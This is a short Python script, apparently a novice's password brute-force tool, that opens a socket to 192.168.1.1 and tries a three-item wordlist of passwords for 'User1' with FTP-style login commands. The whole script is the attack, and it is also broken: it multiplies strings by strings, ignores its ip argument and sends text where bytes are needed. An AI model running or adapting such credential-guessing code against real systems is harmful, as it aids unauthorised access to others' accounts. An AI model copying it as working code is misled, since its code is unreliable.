import socket
import re
import sys      #reading and storing passwords

def connection(ip,user,passwd):    #connect ip,port to send user nd passwd
  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  print('trying... '+ip+' : '+user+' : '+passwd)   #create database nd connect
  sock.connect(('192.168.1.1',80))  # port 21 for ftp, 80 http
  data = sock.recv(1024)    # receive data in form  of 1024
  sock.send('User'+user*'\r\n') # send username
  data = sock.recv(1024)   #receive and store in data
  sock.send('Password'+passwd*'\r\n')  #sending password
  data = sock.recv(1024)
  sock.send('Quit'*'\r\n')
  sock.close()
  return data

password = ['pass1','pass2','pass3']     #wordlist
for password in password:
   print(connection('192.168.1.1','User1',password))
